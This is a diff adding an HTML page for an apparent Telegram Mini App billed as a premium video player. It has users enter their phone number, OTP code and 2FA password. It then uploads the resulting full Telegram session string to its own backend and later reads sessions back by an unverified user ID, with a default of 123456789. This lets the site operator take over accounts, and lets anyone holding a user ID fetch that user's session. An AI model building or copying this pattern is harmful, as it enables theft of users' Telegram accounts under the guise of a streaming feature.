@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Premium Telegram Player</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  
+  <!-- GramJS Library for Browser (Replaces Vite/Node.js) -->
+  <script src="https://cdn.jsdelivr.net/npm/telegram@2.22.2/browser/bundle.js"></script>
+  <!-- bigInt dependency required for chunk calculation -->
+  <script src="https://cdn.jsdelivr.net/npm/big-integer@1.6.52/BigInteger.min.js"></script>
+
+  <style>
+    body { background-color: #050509; color: white; font-family: 'Outfit', sans-serif; overflow: hidden; margin: 0; }
+    .glass { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
+    .input-field { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: white; width: 100%; padding: 12px 16px; border-radius: 12px; outline: none; margin-bottom: 16px; text-align: center; }
+    .input-field:focus { border-color: #6366f1; }
+    .btn { background: linear-gradient(135deg, #4fc3ff 0%, #22e6c5 100%); color: black; width: 100%; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+    .btn:active { transform: scale(0.96); }
+    video { width: 100vw; height: 100vh; object-fit: contain; background: black; }
+    .back-btn { position: absolute; top: 20px; left: 20px; z-index: 50; background: rgba(0,0,0,0.5); padding: 10px 15px; border-radius: 12px; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); }
+  </style>
+</head>
+<body>
+
+  <button class="back-btn" onclick="history.back()"><i class="fa-solid fa-arrow-left"></i> Back</button>
+
+  <!-- LOGIN OVERLAY -->
+  <div id="loginOverlay" class="fixed inset-0 z-40 flex items-center justify-center bg-black/95 backdrop-blur-xl">
+    <div class="glass w-full max-w-sm rounded-3xl p-8 text-center shadow-[0_0_50px_rgba(79,195,255,0.15)]">
+      <div class="h-16 w-16 bg-indigo-500/20 text-indigo-500 rounded-full flex items-center justify-center text-2xl mx-auto mb-4 shadow-[0_0_20px_rgba(79,195,255,0.2)]">
+        <i class="fa-brands fa-telegram"></i>
+      </div>
+      <h2 class="text-xl font-bold mb-1 text-white">Stream Authorization</h2>
+      <p class="text-sm text-gray-400 mb-6">Link your Telegram account to unlock ultra-fast, buffer-free streaming.</p>
+
+      <div id="stepPhone">
+        <input type="text" id="phoneInput" class="input-field" placeholder="Phone Number (e.g. +919876543210)">
+        <button class="btn" onclick="sendCode()">Send OTP Code</button>
+      </div>
+
+      <div id="stepCode" class="hidden">
+        <input type="text" id="codeInput" class="input-field tracking-[0.5em] font-mono" placeholder="12345">
+        <button class="btn" onclick="verifyCode()">Verify Code</button>
+      </div>
+
+      <div id="stepPassword" class="hidden">
+        <input type="password" id="passwordInput" class="input-field" placeholder="2FA Password">
+        <button class="btn" onclick="verifyPassword()">Unlock Stream</button>
+      </div>
+      
+      <p id="statusMsg" class="text-xs text-indigo-400 mt-4 font-bold">Checking connection...</p>
+    </div>
+  </div>
+
+  <!-- PLAYER UI -->
+  <div id="playerUI" class="hidden relative w-full h-full">
+    <div id="loadingUI" class="absolute inset-0 flex flex-col items-center justify-center z-20 bg-black/80">
+      <i class="fa-solid fa-spinner fa-spin text-4xl text-indigo-500 mb-3"></i>
+      <p id="player-status-text" class="font-bold">Fetching Video Stream...</p>
+    </div>
+    <video id="videoPlayer" controls controlsList="nodownload" playsinline autoplay></video>
+  </div>
+
+  <script>
+    const tg = window.Telegram ? window.Telegram.WebApp : null;
+    if (tg) tg.expand();
+
+    const { Api, TelegramClient } = telegram;
+    const { StringSession } = telegram.sessions;
+    const bigInt = window.bigInt; // From CDN
+
+    // API Keys provided by backend via Jinja template
+    const apiId = Number("{{ api_id }}"); 
+    const apiHash = "{{ api_hash }}";
+    
+    let client;
+    let phoneCodeHash = '';
+    const UID = tg?.initDataUnsafe?.user?.id || 123456789;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatIdParam = urlParams.get('chat');
+    const msgIdParam = Number(urlParams.get('msg'));
+
+    function setStatus(msg) { document.getElementById('statusMsg').innerText = msg; }
+
+    // ==========================================
+    // 1. BOOT SEQUENCE
+    // ==========================================
+    async function startApp() {
+        if (!chatIdParam || !msgIdParam) return;
+
+        // Register Service Worker for Piped Streaming
+        if ('serviceWorker' in navigator) {
+            try {
+                const reg = await navigator.serviceWorker.register('/sw.js?v=6');
+                await navigator.serviceWorker.ready;
+                if (!navigator.serviceWorker.controller) {
+                    window.location.reload(); return;
+                }
+            } catch (err) { console.error('SW Error:', err); return; }
+        }
+
+        // Check Encrypted Session from Firebase via Backend
+        try {
+            const res = await fetch(`/api/session/get/${UID}`);
+            const data = await res.json();
+            
+            if (data.success && data.session) {
+                document.getElementById('loginOverlay').classList.add('hidden');
+                document.getElementById('playerUI').classList.remove('hidden');
+                await connectAndStream(data.session);
+            } else {
+                setStatus("Please login with Telegram.");
+                client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+                await client.connect();
+            }
+        } catch (e) { setStatus("Network error checking session."); }
+    }
+
+    // ==========================================
+    // 2. GRAMJS LOGIN LOGIC
+    // ==========================================
+    async function sendCode() {
+      setStatus('Requesting OTP...');
+      const phone = document.getElementById('phoneInput').value.replace(/\s/g, '');
+      try {
+        const res = await client.sendCode({ apiId, apiHash }, phone);
+        phoneCodeHash = res.phoneCodeHash;
+        document.getElementById('stepPhone').classList.add('hidden');
+        document.getElementById('stepCode').classList.remove('hidden');
+        setStatus('OTP sent to your Telegram App!');
+      } catch (err) { setStatus(err.message); }
+    }
+
+    async function verifyCode() {
+      setStatus('Verifying...');
+      const code = document.getElementById('codeInput').value.replace(/\s/g, '');
+      const phone = document.getElementById('phoneInput').value.replace(/\s/g, '');
+      try {
+        await client.signIn(phone, { phoneCodeHash, phoneCode: code });
+        await finalizeLogin();
+      } catch (err) {
+        if (err.message.includes('SESSION_PASSWORD_NEEDED')) {
+          document.getElementById('stepCode').classList.add('hidden');
+          document.getElementById('stepPassword').classList.remove('hidden');
+          setStatus('2FA Password required.');
+        } else { setStatus(err.message); }
+      }
+    }
+
+    async function verifyPassword() {
+      setStatus('Verifying Password...');
+      const password = document.getElementById('passwordInput').value.trim();
+      try {
+        await client.signInWithPassword({ password: password, apiId, apiHash });
+        await finalizeLogin();
+      } catch (err) { setStatus(err.message); }
+    }
+
+    async function finalizeLogin() {
+      setStatus('Securing Session...');
+      const sessionString = client.session.save();
+      
+      // Save Encrypted Session to Backend
+      await fetch('/api/session/save', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ uid: UID, session: sessionString })
+      });
+
+      document.getElementById('loginOverlay').classList.add('hidden');
+      document.getElementById('playerUI').classList.remove('hidden');
+      await connectAndStream(sessionString);
+    }
+
+    // ==========================================
+    // 3. TELEGRAM STREAMING ENGINE (Using SW)
+    // ==========================================
+    async function connectAndStream(sessionStr) {
+        const statusText = document.getElementById('player-status-text');
+        statusText.textContent = "Connecting to Secure DC...";
+
+        const session = new StringSession(sessionStr);
+        
+        // Telegram Web DC Routing Fix
+        const DC_HOSTNAMES = {
+            1: 'pluto.web.telegram.org', 2: 'venus.web.telegram.org',
+            3: 'aurora.web.telegram.org', 4: 'vesta.web.telegram.org', 5: 'flora.web.telegram.org'
+        };
+        const originalSetDC = session.setDC.bind(session);
+        session.setDC = (dcId, serverAddress, port, downloadDC) => {
+            return originalSetDC(dcId, DC_HOSTNAMES[dcId] || serverAddress, port, downloadDC);
+        };
+        if (session.dcId && DC_HOSTNAMES[session.dcId]) session.setDC(session.dcId, DC_HOSTNAMES[session.dcId], 443);
+
+        client = new TelegramClient(session, apiId, apiHash, { connectionRetries: 5, useWSS: true });
+        await client.connect();
+
+        statusText.textContent = "Extracting Video Chunks...";
+        
+        const messages = await client.getMessages(chatIdParam, { ids: msgIdParam });
+        const media = messages[0]?.media;
+
+        if (!media || !media.document) {
+            statusText.textContent = "Error: Video not found or deleted.";
+            return;
+        }
+        
+        const fileSize = Number(media.document.size);
+        const activeStreams = new Set();
+
+        // Listen to Service Worker requests
+        navigator.serviceWorker.addEventListener('message', async (event) => {
+            if (event.data.type === 'CANCEL_STREAM') {
+                activeStreams.delete(event.data.streamId);
+                return;
+            }
+
+            if (event.data.type === 'FETCH_RANGE') {
+                const { range, streamId } = event.data;
+                activeStreams.add(streamId);
+                const port = event.ports[0];
+
+                const parts = range.replace(/bytes=/, "").split("-");
+                const reqStart = parseInt(parts[0], 10) || 0;
+                const reqEnd = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;
+
+                const ALIGNMENT = 512 * 1024; // 512KB Telegram Chunk Size
+                const tgStart = Math.floor(reqStart / ALIGNMENT) * ALIGNMENT;
+                const tgEnd = Math.ceil((reqEnd + 1) / ALIGNMENT) * ALIGNMENT - 1;
+                const tgLimit = tgEnd - tgStart + 1;
+
+                port.postMessage({ type: 'METADATA', start: reqStart, end: reqEnd, totalSize: fileSize });
+
+                try {
+                    let currentOffset = reqStart;
+                    let isFirstChunk = true;
+
+                    for await (const chunk of client.iterDownload({
+                        file: media, offset: bigInt(tgStart), limit: bigInt(tgLimit), requestSize: ALIGNMENT
+                    })) {
+                        if (!activeStreams.has(streamId)) break; 
+
+                        let bufferToSend = chunk;
+                        if (isFirstChunk) {
+                            const skipBytes = reqStart - tgStart;
+                            if (skipBytes > 0) bufferToSend = chunk.slice(skipBytes);
+                            isFirstChunk = false;
+                        }
+
+                        const maxRemaining = (reqEnd - currentOffset) + 1;
+                        if (bufferToSend.length > maxRemaining) {
+                            bufferToSend = bufferToSend.slice(0, maxRemaining);
+                        }
+
+                        if (bufferToSend.length > 0) {
+                            // Use native Uint8Array to ArrayBuffer for SW
+                            const arrayBuffer = new Uint8Array(bufferToSend).buffer;
+                            port.postMessage({ type: 'CHUNK', buffer: arrayBuffer }, [arrayBuffer]);
+                            currentOffset += bufferToSend.length;
+                        }
+
+                        if (currentOffset > reqEnd) break;
+                    }
+
+                    if (activeStreams.has(streamId)) {
+                        port.postMessage({ type: 'DONE' });
+                        activeStreams.delete(streamId);
+                    }
+                } catch (err) {
+                    if (err.message && !err.message.includes('LIMIT_INVALID')) console.error("Stream Error:", err.message);
+                    port.postMessage({ type: 'ERROR', error: err.message });
+                    activeStreams.delete(streamId);
+                }
+            }
+        });
+
+        // Trigger Video playback through Service Worker Route
+        const videoElement = document.getElementById('videoPlayer');
+        videoElement.src = `/tg-stream/video_${msgIdParam}.mp4`;
+        document.getElementById('loadingUI').classList.add('hidden');
+    }
+
+    startApp();
+  </script>
+</body>
+</html>
